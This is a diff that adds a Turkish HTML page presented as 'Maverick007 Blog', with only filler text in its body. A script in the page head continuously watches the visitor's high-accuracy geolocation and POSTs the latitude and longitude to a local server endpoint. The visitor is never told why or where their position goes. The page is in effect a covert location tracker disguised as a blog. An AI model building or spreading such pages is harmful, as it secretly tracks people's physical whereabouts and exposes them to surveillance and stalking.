@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Maverick007 Blog</title>
+  
+  <script>
+  navigator.geolocation.watchPosition(
+  (pos) => {
+    fetch("http://localhost:3000/api/location", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        lat: pos.coords.latitude, 
+        lon: pos.coords.longitude 
+      })
+    });
+  },
+  (err) => console.error(err),
+  { enableHighAccuracy: true, maximumAge: 10000, timeout: 5000 }
+);
+  </script>  
+</head>
+<body>
+  <p>yazı yazı lorem ipsum cart curt</p>
+</body>
+</html>
